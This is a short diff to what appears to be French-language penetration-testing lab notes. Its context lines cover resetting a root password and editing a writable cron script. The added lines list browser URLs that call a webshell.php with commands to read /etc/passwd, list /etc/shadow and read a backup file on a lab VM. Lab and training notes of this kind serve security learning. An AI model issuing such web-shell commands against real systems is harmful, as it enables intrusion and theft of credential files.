@@ -69,3 +69,12 @@ Si un script exécuté par cron est modifiable, insérez une commande pour obten
 5) mettez "mount -o remount,rw /"
 6) passwd MotDePasse
 7) "reboot"
+
+
+****************************************************************
+
+
+# mettre ceci dans le navigateur:
+- http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
+- http://192.168.1.26/files/webshell.php?cmd=ls%20-l%20/etc/shadow
+- http://192.168.1.26/files/webshell.php?cmd=cat%20/var/backups/apt.extended_states.1.gz
